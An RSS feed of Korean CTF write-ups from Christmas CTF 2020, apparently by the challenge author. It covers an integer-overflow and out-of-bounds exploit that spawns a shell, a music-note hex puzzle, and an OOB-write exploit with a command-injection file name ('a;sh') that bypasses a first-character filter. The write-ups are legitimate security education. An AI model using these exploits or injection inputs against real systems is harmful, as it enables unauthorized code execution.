<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Tue, 29 Dec 2020 12:01:08 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - Match Maker</title>
      <link>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;문제-개요&quot;&gt;&lt;a href=&quot;#문제-개요&quot; class=&quot;headerlink&quot; title=&quot;문제 개요&quot;&gt;&lt;/a&gt;문제 개요&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/12/29/fabu1ous/match-maker/1.png&quot;&gt;&lt;/p&gt;
&lt;ol</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/match-maker/1.png"></p><ol><li><p>프로필을 만듭니다.</p><ul><li>이름, 나이, 성별, 취미를 입력</li><li>나이 정보에 따라 파트너 매칭 함수가 달라짐</li></ul></li><li><p>만든 프로필을 저장합니다.</p><ul><li>만들어진 프로필을 힙에 저장</li><li>성별을 구분하여 전역 배열에 힙 주소 저장.</li></ul></li><li><p>파트너 매칭을 합니다.</p></li><li><p>매칭 된 파트너의 정보를 출력합니다.</p></li><li><p>유저 리스트를 출력합니다.</p><ul><li>현재 프로필이 남자면 여자 리스트를 출력</li><li>현재 프로필이 여자면 남자 리스트를 출력</li></ul></li></ol><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p>find match 기능에서 사용할 알고리즘을 정하는 로직이 존재합니다. pref_min_age != pref_max_age이면서 pref_min_age ^ 2 == pref_max_age ^ 2 일 때 초기화되지 않은 스택의 쓰레기 값으로 rip를 조작할 수 있습니다. int-overflow를 활용하면 됩니다.</p><p>show user list 기능에서 user list를 참조할 때 sex ^1을 index로 사용합니다. 프로필 작성 시 성별 입력값에 제한이 없기 때문에 이를 이용해 바이너리 base주소와 libc base 주소를 얻을 수 있습니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>int overflow → uninitialized stack</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/2.png"></p><p>프로필 생성 메뉴에서 입력받은 나이 정보를 토대로 파트너 매칭 루틴을 정하는 코드입니다. if…else가 아닌 if…if 이므로 integer overflow를 발생시켜 <code>(void*)func()</code>의 값을 스택에 있던 쓰레기 값으로 설정할 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/3.png"></p><p>연상 혹은 연하 중 선호하는 쪽을 계산하는 루틴에서 절댓값을 사용합니다. 입력할 수 있는 나이에 최댓값 제한이 없기 때문에 int overflow를 발생시켜 스택 변수 <code>(void*)func()를</code> 초기화하는 작업을 건너뛸 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/4.png"></p><p><code>(void*)func()</code>값에 영향을 미치는 쓰레기 값은 name을 입력받을 때 사용하던 버퍼입니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/5.png"></p><p>메인 메뉴에서 find match를 선택하면 rip가 잡히는 것을 확인할 수 있습니다.</p><ul><li>out of bound read</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/6.png"></p><p>성별은 int로 입력받습니다.</p><p>0 : 남자</p><p>1 : 여자</p><p><img src="/2020/12/29/fabu1ous/match-maker/7.png"></p><p>현재 프로필이 남자면 여자 유저 리스트를, 여자면 남자 리스트를 출력해주는 함수입니다. 0도 1도 아닌 다른 값을 성별로 입력하면 oob-read가 가능합니다. binary의 base주소, libc의 base주소를 leak 할 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./match&#x27;</span>)<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make</span>(<span class="hljs-params">age, name, Pmin, Pmax, sex</span>):</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>, age)p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)p.sendlineafter(<span class="hljs-string">&#x27;min age limit for you: &#x27;</span>, Pmin)p.sendlineafter(<span class="hljs-string">&#x27;max age limit for you: &#x27;</span>, Pmax)p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, sex)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 1 : &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 2 : &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 3 : &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showL</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-comment"># leak bin base</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;-2&#x27;</span>)showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)bin_base = leak - <span class="hljs-number">0x5008</span>log.info(hex(bin_base))<span class="hljs-comment"># leak read@libc</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, p64(bin_base+<span class="hljs-number">0x4fa0</span>)+<span class="hljs-string">b&#x27;BBBBBBBBCCCCCCCC&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)save()showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)system = leak - <span class="hljs-number">0xbbd20</span>log.info(hex(system))make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span>+p64(system), <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)find()p.interactive()</code></pre><pre><code class="hljs plain">[+] Opening connection to localhost on port 1234: Done[*] 0x55ad3a345000[*] 0x7f414a9ec410[*] Switching to interactive mode$ cat flagXMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      <category domain="https://hackyboiz.github.io/tags/uninitialized-stack/">uninitialized stack</category>
      
      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - No g</title>
      <link>https://hackyboiz.github.io/2020/12/29/fabu1ous/no-g/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/fabu1ous/no-g/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;문제-개요&quot;&gt;&lt;a href=&quot;#문제-개요&quot; class=&quot;headerlink&quot; title=&quot;문제 개요&quot;&gt;&lt;/a&gt;문제 개요&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/12/29/fabu1ous/no-g/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;음계(Scal</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/no-g/1.png"></p><p>음계(Scale)를 알파벳으로 나타내곤 합니다. 음이름이라고 하죠.</p><p>라(A), 시(B), 도(C), 레(D), 미(E) , 파(F), 솔(G)</p><p>16진수(HEX) 또한 알파벳을 사용해 수를 표현합니다.</p><p>10(A), 11(B), 12(C), 13(D), 14(E), 15(F)</p><p><img src="/2020/12/29/fabu1ous/no-g/hint.jpg"></p><p>악보에 그려진 음표를 알파벳으로, 그 알파벳을 hex값으로 치환하고 연결된 음표들끼리 hex값을 더해 ASCII로 변환하면 하나의 문자가 됩니다.</p><p>예 ) 라라라 → chr(0xa+0xa+0xa) → ‘\x1e’</p><p>hex에는 G가 없기 때문에 악보의 제목이 ‘No G’입니다. </p><p>제가 의도한 풀이 접근 방식은 이렇습니다.</p><ol><li>제목에서 힌트를 얻어 음이름을 찾아본다.</li><li>첫 여섯 음의 hex값을 더해봤더니 ‘X’가 나온다.</li><li>flag 형식이 ‘XMAS{}’이므로 2번 과정을 몇 번 더 반복해 본다.</li></ol><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs python">note = [<span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>]idx = [<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]flag = []pre_chk = <span class="hljs-number">0</span><span class="hljs-keyword">while</span>(len(flag) &lt; len(idx)):cur_chk = idx[len(flag)]buf = note[pre_chk:pre_chk+cur_chk]result = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(buf)): <span class="hljs-keyword">if</span>(buf[i] == <span class="hljs-string">&#x27;la&#x27;</span>): result += <span class="hljs-number">0xa</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;ti&#x27;</span>): result += <span class="hljs-number">0xb</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;do&#x27;</span>): result += <span class="hljs-number">0xc</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;re&#x27;</span>): result += <span class="hljs-number">0xd</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;mi&#x27;</span>): result += <span class="hljs-number">0xe</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;fa&#x27;</span>): result += <span class="hljs-number">0xf</span>flag.append(chr(result))print(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))pre_chk += cur_chk</code></pre><pre><code class="hljs plain">XXMXMAXMASXMAS&#123;XMAS&#123;7XMAS&#123;7hXMAS&#123;7heXMAS&#123;7herXMAS&#123;7her3XMAS&#123;7her3_XMAS&#123;7her3_iXMAS&#123;7her3_i5XMAS&#123;7her3_i5_XMAS&#123;7her3_i5_nXMAS&#123;7her3_i5_noXMAS&#123;7her3_i5_no_XMAS&#123;7her3_i5_no_GXMAS&#123;7her3_i5_no_G_XMAS&#123;7her3_i5_no_G_iXMAS&#123;7her3_i5_no_G_inXMAS&#123;7her3_i5_no_G_in_XMAS&#123;7her3_i5_no_G_in_HXMAS&#123;7her3_i5_no_G_in_H3XMAS&#123;7her3_i5_no_G_in_H3XXMAS&#123;7her3_i5_no_G_in_H3X&#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/misc/">misc</category>
      
      <category domain="https://hackyboiz.github.io/tags/scale/">scale</category>
      
      <category domain="https://hackyboiz.github.io/tags/hex/">hex</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/no-g/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - oil system</title>
      <link>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;머릿말&quot;&gt;&lt;a href=&quot;#머릿말&quot; class=&quot;headerlink&quot; title=&quot;머릿말&quot;&gt;&lt;/a&gt;머릿말&lt;/h1&gt;&lt;p&gt;CVE-2020–15647는 Firefox Fennec v68.9.0에서 발생하는 Arbitrary local file</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>CVE-2020–15647는 Firefox Fennec v68.9.0에서 발생하는 Arbitrary local file access입니다. 파일을 Cache 할 때 해당 파일의 이름을 해쉬 해야 하지만 Firefox Fennec v68.9.0의 <code>content:// URI</code> 로직엔 존재하지 않기 때문에 Arbitrary local file access가 발생합니다. 이런 상황을 pwnable 문제로 구현해봤는데…</p><p><img src="/2020/12/29/fabu1ous/oil-system/1.png"></p><p>unintended solution으로 커멘드 인젝션이 존재합니다. 상위권 솔브가 모두 커멘드 인젝션이더군요… 하하하. 문제 검수 단계에서 커멘드 인젝션에 대한 말이 나와서 수정하고 검증까지 했는데 수정 안된 버전이 대회 때 올라갔네요.</p><p>oil-system 문제를 풀어주신 분들께 정말 죄송합니다. 조금 더 철저하게 준비했어야 됐는데…</p><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p><img src="/2020/12/29/fabu1ous/oil-system/2.png"></p><p><img src="/2020/12/29/fabu1ous/oil-system/3.png"></p><p>문제 바이너리는 subleq이라는 One-Instruction-Language system 에뮬레이터입니다. subleq 코드를 담고 있는 파일에서 데이터를 읽어와 스택에 저장하고 그 코드를 해석해 동작합니다. subleq코드를 해석하는 함수에 OOB 취약점이 존재해 리턴 값을 조작할 수 있습니다. subleq 코드를 담고 있는 파일을 cache 하는 루틴도 존재하는데 파일의 경로만 바뀔 뿐 파일명을 유지합니다. Write Code 기능으로 flag라는 파일을 생성하고 실제 flag파일이 cache 되도록 리턴 값을 유도하면 됩니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>OOB</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/4.png"></p><p>위 사진은 함수 subleq()의 코드입니다. a2의 index로 사용되는 v4와 v5의 최댓값이 존재하지 않기 때문에 oob write가 가능합니다. v4와 v5값를 이용해 a2보다 높은 주소에 있는 스택 어디든 참조할 수 있게 되고 리턴 값을 오염시킬 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1234</span>)<span class="hljs-comment"># Write Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendafter(<span class="hljs-string">&#x27;Enter your Program\&#x27;s Name : &#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Enter Code : &#x27;</span>,<span class="hljs-string">&#x27;4 166 -1 -1 -1054&#x27;</span>)<span class="hljs-comment"># Run Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-comment"># Get flag with View Cached code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.interactive()</code></pre><pre><code class="hljs routeros">[+] Opening<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> localhost on<span class="hljs-built_in"> port </span>1234: Done[*] Switching <span class="hljs-keyword">to</span> interactive modeXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125; ========[ Menu ]======== 1. Read test description 2. Write Code 3. <span class="hljs-builtin-name">Run</span> Code 4. View Cached code &gt; TIMEOUT[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive</code></pre><h1 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h1><ul><li>unintended solution</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/5.png"></p><p>파일명 필터 함수입니다. 파일명에 영문 소문자 이외의 입력이 들어온다면 프로세스를 종료합니다. 안타깝게도 유심히 보시면 첫 글자만 검사한다는 것을 알 수 있습니다. <s>문제 만든 놈이 픵신인듯</s></p><pre><code class="hljs plain"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 2 Enter your Program&#39;s Name : a;sh Enter Code : your an idiot &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 3 Error while fopen$ cat flagXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125;$</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - angrforge</title>
